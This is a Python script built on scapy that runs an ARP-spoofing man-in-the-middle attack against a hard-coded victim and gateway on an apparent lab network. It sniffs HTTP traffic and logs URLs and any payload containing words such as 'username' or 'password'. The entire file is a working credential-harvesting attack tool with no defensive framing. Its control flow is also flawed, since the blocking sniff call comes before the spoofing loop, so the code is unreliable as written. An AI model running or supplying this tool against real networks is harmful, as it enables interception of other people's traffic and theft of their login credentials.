import logging
import scapy.all as scapy
from scapy.layers import http
import time
import sys

# Configure logging settings
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def sniff(interface):
    """
    Start sniffing on the specified network interface.
    :param interface: The network interface to sniff on.
    """
    # Start sniffing on the specified interface, without storing packets, 
    # and call process_sniffed_packet for each packet captured
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    """
    Extract and return the URL from the HTTP request packet.
    :param packet: The packet from which to extract the URL.
    :return: The URL from the HTTP request.
    """
    # Concatenate the Host and Path fields from the HTTP request to form the URL
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    """
    Extract possible login information from the packet.
    :param packet: The packet from which to extract login information.
    :return: The extracted login information if any keywords are found.
    """
    if packet.haslayer(scapy.Raw):  # Check if the packet has a Raw layer (contains payload data)
        load = str(packet[scapy.Raw].load)  # Convert the payload data to a string
        keywords = ["username", "user", "login", "password", "pass"]  # List of keywords to search for
        for keyword in keywords:  # Iterate over each keyword
            if keyword.lower() in load.lower():  # Check if the keyword is present in the payload (case insensitive)
                return load  # Return the payload if a keyword is found

def process_sniffed_packet(packet):
    """
    Process sniffed packet to find and print HTTP requests and possible login information.
    :param packet: The packet to process.
    """
    try:
        if packet.haslayer(http.HTTPRequest):  # Check if the packet contains an HTTP request
            url = get_url(packet)  # Extract the URL from the HTTP request packet
            logging.info(f"HTTP Request >> {url.decode()}")  # Log the URL of the HTTP request
            
            if login_info := get_login_info(packet):  # Extract and check for login information using a named expression
                logging.info(f"Possible username/password > {login_info}")  # Log the possible login information
    except Exception as e:  # Catch any exceptions that occur
        logging.error(f"Error processing packet: {e}")  # Log the error message

# Function to get the MAC address of a given IP
def get_mac(ip):
    """
    Get the MAC address of the specified IP address.
    :param ip: The IP address to resolve to a MAC address.
    :return: The MAC address associated with the IP address.
    """
    # Create an ARP request packet for the target IP
    arp_request = scapy.ARP(pdst=ip)
    # Create an Ethernet frame with a broadcast destination MAC address
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # Combine the Ethernet frame and ARP request
    arp_request_broadcast = broadcast/arp_request
    # Send the packet and receive the response
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # Check if we got a response
    if len(answered_list) == 0:
        print(f"Could not find MAC address for IP: {ip}")
        sys.exit(1)

    # Return the MAC address from the first response
    return answered_list[0][1].hwsrc

# Function to send a spoofed ARP reply
def spoof(target_ip, spoof_ip):
    """
    Send a spoofed ARP reply to a target IP address.
    :param target_ip: The IP address to send the spoofed ARP reply to.
    :param spoof_ip: The IP address to impersonate in the ARP reply.
    """
    # Get the MAC address of the target IP
    target_mac = get_mac(target_ip)
    # Create an ARP reply packet with the spoofed information
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # Send the packet
    scapy.send(packet)

# Function to restore the original ARP table entries
def restore(target_ip, source_ip):
    """
    Restore the original ARP table entries.
    :param target_ip: The IP address of the target.
    :param source_ip: The IP address of the source.
    """
    # Get the MAC addresses of the target and source IPs
    target_mac = get_mac(target_ip) 
    source_mac = get_mac(source_ip)
    # Create an ARP reply packet to restore the original mapping
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    # Send the packet multiple times to ensure it is received
    scapy.send(packet, count=4, verbose=False)

# Main script execution
try:
    # Start sniffing on the specified network interface (e.g., "Ethernet")
    sniff("Ethernet")
    # Loop to continuously send spoofed ARP replies
    while True:
        # Spoof the victim to believe the attacker is the gateway
        spoof("10.0.2.7", "10.0.2.1")
        # Spoof the gateway to believe the attacker is the victim
        spoof("10.0.2.1", "10.0.2.7")
        # Wait for 2 seconds before sending the next set of packets
        time.sleep(2)
except KeyboardInterrupt:
    # Handle the interrupt signal (CTRL+C) to stop the script
    print("Detected CTRL+C. Restoring ARP tables...")
    # Restore the ARP table entries for the victim and the gateway
    restore("10.0.2.7", "10.0.2.1") 
    restore("10.0.2.1", "10.0.2.7")
    print("ARP tables restored.")
    # Exit the script
    sys.exit(0)
